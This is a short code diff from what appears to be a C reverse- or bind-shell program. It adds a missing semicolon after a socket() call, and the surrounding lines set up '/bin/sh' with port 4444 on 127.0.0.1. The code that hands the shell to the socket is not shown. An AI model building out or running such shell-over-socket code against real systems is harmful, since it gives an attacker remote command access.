@@ -18,7 +18,7 @@ int main()
         char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
         char buf[16];
 
-        sock = socket(AF_INET, SOCK_STREAM, 0)
+        sock = socket(AF_INET, SOCK_STREAM, 0);
       
         server.sin_family = AF_INET;
         server.sin_port = htons(atoi(arguments[2]));
